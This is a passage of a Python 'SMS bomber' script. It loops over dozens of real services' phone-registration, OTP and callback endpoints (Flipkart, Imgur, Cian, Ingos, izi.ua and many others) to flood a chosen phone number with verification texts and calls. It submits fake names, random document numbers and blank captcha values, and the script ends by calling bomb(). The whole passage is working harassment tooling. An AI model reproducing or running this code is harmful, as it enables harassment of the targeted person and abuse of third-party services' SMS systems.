            log = requests.post("https://app.karusel.ru/api/v1/phone/", data={"phone": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://izi.ua/api/auth/register", json={"phone": "+" + phone, "name": name, "is_terms_accepted": True}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+" + phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+## (###) ###-##-##")
            log = requests.post("https://iqlab.com.ua/session/ajaxregister", data={"cellphone": formatted_phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://www.ingos.ru/api/v1/lk/auth/register/fast/step2", headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal", "User-Agent": generate_user_agent()}, json={"Birthday": "1986-07-10T07:19:56.276+02:00", "DocIssueDate": "2004-02-05T07:19:56.276+02:00", "DocNumber": randint(500000, 999999), "DocSeries": randint(5000, 9999), "FirstName": name, "Gender": "M", "LastName": name, "SecondName": name, "Phone": phone9, "Email": email}, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru", data={"mode": "request", "phone": "+" + phone, "phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://api.imgur.com/account/v1/phones/verify", json={"phone_number": phone, "region_code": "RU"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={"msisdn": phone, "locale": "en", "countryCode": "ru", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.get("https://api.hmara.tv/stable/entrance", params={"contact": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://helsi.me/api/healthy/accounts/login", json={"phone": phone, "platform": "PISWeb"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://www.hatimaki.ru/register/", data={"REGISTER[LOGIN]": phone, "REGISTER[PERSONAL_PHONE]": phone, "REGISTER[SMS_CODE]": "", "resend-sms": "1", "REGISTER[EMAIL]": "", "register_submit_button": "Зарегистрироваться"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://guru.taxi/api/v1/driver/session/verify", json={"phone": {"code": 1, "number": phone9}}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://crm.getmancar.com.ua/api/veryfyaccount", json={"phone": "+" + phone, "grant_type": "password", "client_id": "gcarAppMob", "client_secret": "SomeRandomCharsAndNumbersMobile"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            log = requests.post("https://foodband.ru/api?call=calls", data={"customerName": name, "phone": formatted_phone, "g-recaptcha-response": ""}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.get("https://foodband.ru/api/", params={"call": "customers/sendVerificationCode", "phone": phone9, "g-recaptcha-response": ""}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://www.flipkart.com/api/5/user/otp/generate", headers={"Origin": "https://www.flipkart.com", "User-Agent": generate_user_agent()}, data={"loginId": "+" + phone}, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://www.flipkart.com/api/6/user/signup/status", headers={"Origin": "https://www.flipkart.com", "User-Agent": generate_user_agent()}, json={"loginId": "+" + phone, "supportAllStates": True}, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://fix-price.ru/ajax/register_phone_code.php", data={"register_call": "Y", "action": "getCode", "phone": "+" + phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.get("https://findclone.ru/register", params={"phone": "+" + phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://www.finam.ru/api/smslocker/sendcode", data={"phone": "+" + phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            log = requests.post("https://2407.smartomato.ru/account/session", json={"phone": formatted_phone, "g-recaptcha-response": None}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://www.etm.ru/cat/runprog.html", data={"m_phone": phone9, "mode": "sendSms", "syf_prog": "clients-services", "getSysParam": "yes"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.get("https://api.eldorado.ua/v1/sign/", params={"login": phone, "step": "phone-check", "fb_id": "null", "fb_token": "null", "lang": "ru"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+## (###) ###-##-##")
            log = requests.post("https://e-groshi.com/online/reg", data={"first_name": name, "last_name": name, "third_name": name, "phone": formatted_phone, "password": password, "password2": password}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://vladimir.edostav.ru/site/CheckAuthLogin", data={"phone_or_email": "+" + phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://api.easypay.ua/api/auth/register", json={"phone": phone, "password": password}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://my.dianet.com.ua/send_sms/", data={"phone": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://api.delitime.ru/api/v2/signup", data={"SignupForm[username]": phone, "SignupForm[device_type]": 3}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            log = requests.post("https://api.creditter.ru/confirm/sms/send", json={"phone": formatted_phone, "type": "register"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://clients.cleversite.ru/callback/run.php", data={"siteid": "62731", "num": phone, "title": "Онлайн-консультант", "referrer": "https://m.cleversite.ru/call"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://city24.ua/personalaccount/account/registration", data={"PhoneNumber": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/", headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            log = requests.post("https://cinema5.ru/api/phone_code", data={"phone": formatted_phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено")
        except:
            pass
        try:
            log = requests.post("https://api.cian.ru/sms/v1/send-validation-code/", json={"phone": "+" + phone, "type": "authenticateCode"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://api.carsmile.com/", son={"operationName": "enterPhone", "variables": {"phone": phone}, "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.get("https://it.buzzolls.ru:9995/api/v2/auth/register", params={"phoneNumber": "+" + phone}, headers={"keywordapi": "ProjectVApiKeyword", "usedapiversion": "3", "User-Agent": generate_user_agent()}, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone9, "(###)###-##-##")
            log = requests.post("https://bluefin.moscow/auth/register/", data={"phone": formatted_phone, "sendphone": "Далее"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://app.benzuber.ru/login", data={"phone": "+" + phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            log = requests.post("https://bartokyo.ru/ajax/login.php", data={"user_phone": formatted_phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://bamper.by/registration/?step=1", data={"phone": "+" + phone, "submit": "Запросить смс подтверждения", "rules": "on"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone9, "(###) ###-##-##")
            log = requests.get("https://avtobzvon.ru/request/makeTestCall", params={"to": formatted_phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            log = requests.post("https://oauth.av.ru/check-phone", json={"phone": formatted_phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            log = requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": phone}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            log = requests.post("https://apteka.ru/_action/auth/getForm/", data={"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "", "form[EMAIL]": "", "form[LOGIN]": formatted_phone, "form[PASSWORD]": password, "get-new-password": "Получите пароль по SMS", "user_agreement": "on", "personal_data_agreement": "on", "formType": "simple", "utc_offset": "120"}, headers=headers, )
            if log.status_code == 200:
                print(Fore.GREEN + "Сообщение отправлено!")
            else:
                print(Fore.RED + "Сообщение не отправлено!")
        except:
            pass
logo()
choice_number()
bomb()